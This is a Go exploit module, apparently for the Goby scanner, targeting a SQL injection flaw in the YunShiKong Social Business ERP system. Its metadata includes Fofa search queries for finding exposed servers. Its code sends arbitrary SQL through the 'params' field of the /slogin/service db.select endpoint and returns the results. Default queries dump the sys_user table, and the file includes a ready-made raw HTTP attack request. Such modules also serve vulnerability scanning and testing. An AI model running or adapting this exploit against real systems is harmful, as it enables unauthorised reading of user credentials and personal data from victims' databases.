package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Cloud space-time social business ERP system service file params parameter SQL injection vulnerability",
    "Description": "<p>Yunshikong series software integrates the best management practice experience of outstanding enterprises in the industry, adopts Java language and Oracle database, and independently develops an advanced and stable secondary development platform.</p><p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, administrator background passwords, site user personal information), attackers can even write Trojan horses into the server under high-privilege conditions to further obtain server system permissions.</p>",
    "Product": "YunShiKong-Social-ERP",
    "Homepage": "http://www.ysk360.com/",
    "DisclosureDate": "2023-03-03",
    "Author": " 715827922@qq.com",
    "FofaQuery": "header=\"emscm.session.id\" || banner=\"emscm.session.id\" || body=\" 云时空社会化商业ERP系统\"",
    "GobyQuery": "header=\"emscm.session.id\" || banner=\"emscm.session.id\" || body=\" 云时空社会化商业ERP系统\"",
    "Level": "2",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, administrator background passwords, site user personal information), attackers can even write Trojan horses into the server under high-privilege conditions to further obtain server system permissions.</p>",
    "Recommendation": "<p>The manufacturer has released a bug fix program, please pay attention to the update in time: <a href=\"http://www.ysk360.com/\">http://www.ysk360.com/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "select * from sys_user where rownum < 10",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "云时空社会化商业 ERP 系统 service 文件 params 参数 SQL  注入漏洞",
            "Product": "云时空社会化商业ERP系统",
            "Description": "<p>云时空系列软件融合了行业中优秀企业的最佳管理实践经验，采用Java 语言和 Oracle 数据库，自主研发先进稳定的二次开发平台。<br></p><p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"http://www.ysk360.com/\">http://www.ysk360.com/</a><br></p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Cloud space-time social business ERP system service file params parameter SQL injection vulnerability",
            "Product": "YunShiKong-Social-ERP",
            "Description": "<p>Yunshikong series software integrates the best management practice experience of outstanding enterprises in the industry, adopts Java language and Oracle database, and independently develops an advanced and stable secondary development platform.</p><p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, administrator background passwords, site user personal information), attackers can even write Trojan horses into the server under high-privilege conditions to further obtain server system permissions.</p>",
            "Recommendation": "<p>The manufacturer has released a bug fix program, please pay attention to the update in time: <a href=\"http://www.ysk360.com/\">http://www.ysk360.com/</a><br></p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, administrator background passwords, site user personal information), attackers can even write Trojan horses into the server under high-privilege conditions to further obtain server system permissions.<br><br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-08-22",
    "PocId": "10829"
}`
	sendPayloadFlag5B8x3 := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		payloadRequestConfig := httpclient.NewPostRequestConfig(`/slogin/service?service=db.select`)
		payloadRequestConfig.VerifyTls = false
		payloadRequestConfig.FollowRedirect = true
		payloadRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		payloadRequestConfig.Data = `params=` + url.QueryEscape(`{"sql":`+strconv.Quote(sql)+`}`)
		return httpclient.DoHttpRequest(hostInfo, payloadRequestConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			resp, err := sendPayloadFlag5B8x3(hostInfo, "SELECT * FROM V$VERSION")
			if err != nil {
				return false
			}
			return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "Database") && strings.Contains(resp.Utf8Html, `"values"`)

		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			sql := goutils.B2S(ss.Params["sql"])
			if attackType == "sqlPoint" {
				sql = "SELECT * FROM V$VERSION"
			}
			resp, err := sendPayloadFlag5B8x3(expResult.HostInfo, sql)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			if !strings.Contains(resp.Utf8Html, `"values"`) && !strings.Contains(resp.Utf8Html, `"recordCount"`) && !strings.Contains(resp.Utf8Html, `"fields"`) {
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
				return expResult
			}
			expResult.Success = true
			if attackType == "sql" {
				expResult.Output = resp.Utf8Html
			} else {
				expResult.Output = `POST /slogin/service?service=db.select HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 64
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close

params=%7b%22sql%22%3a%22SELECT%20*%20FROM%20SESSION_ROLES%22%7d`
			}
			return expResult
		},
	))
}
